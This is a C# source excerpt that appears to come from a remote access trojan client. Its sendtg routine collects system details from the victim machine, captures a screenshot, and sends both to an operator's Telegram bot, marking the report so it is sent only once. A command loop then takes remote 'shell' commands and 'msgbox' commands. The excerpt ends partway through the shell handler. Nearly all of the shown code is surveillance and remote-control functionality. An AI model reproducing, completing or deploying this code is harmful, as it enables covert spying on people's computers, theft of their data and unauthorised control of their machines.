...
namespace Client
{
    internal static class Programa
    {
        ...
        private static Remembrance remembrance = new Remembrance();
        ...
        public static async Task sendtg()
        {
            if (remembrance.GetAttribute("tgsent") != null) {
                return; // already sent
            }

            // Get config values
            var telegramEnabled = config["telegram"]?.Value<bool>() == true;
            var tgid = config["tgid"]?.ToString();
            var tgtoken = config["tgtoken"]?.ToString();

            if (!telegramEnabled || string.IsNullOrEmpty(tgid) || string.IsNullOrEmpty(tgtoken))
                return;

            // Get client info
            var clientInfo = await GClass.BuildClientInfo();

            // Emoji mapping for keys
            ...
            sb.AppendLine("🖥️ <b>Client Info</b>");
            foreach (var prop in clientInfo.Properties())
            {
                string emoji = emojiMap.TryGetValue(prop.Name, out var em) ? em + " " : "";
                sb.AppendLine($"{emoji}<b>{prop.Name}:</b> {prop.Value}");
            }
            string infoText = sb.ToString();

            // Capture screenshot
            var screenshotBytes = GClass.CaptureScreen(Screen.AllScreens[monitoridx], 90);

            using (var httpClient = new HttpClient())
            {
                // Send screenshot and info as a single photo message with caption
                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new ByteArrayContent(screenshotBytes), "photo", "screenshot.jpg");
                    content.Add(new StringContent(tgid), "chat_id");
                    content.Add(new StringContent(infoText), "caption");
                    content.Add(new StringContent("HTML"), "parse_mode");

                    var photoUrl = $"https://api.telegram.org/bot{tgtoken}/sendPhoto";
                    try
                    {
                        await httpClient.PostAsync(photoUrl, content);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Telegram screenshot+info send error: " + ex.Message);
                    }
                    remembrance.SetAttribute("tgsent", "true"); // Mark as sent
                }
            }
        }
        static async Task RunClientAsync()
        {
            ...
            if (GClass.IsTrue("telegram") && config["tgid"] != null && config["tgtoken"] != null)
            {
                _ = sendtg();
            }
                ...
                try
                {
                    ...
                    switch (command)
                    {
                        ...
                        case "msgbox":
                            ...
                            break;
                        case "shell":
                            string shellCommand = (string)message["body"];
                            try
                            {
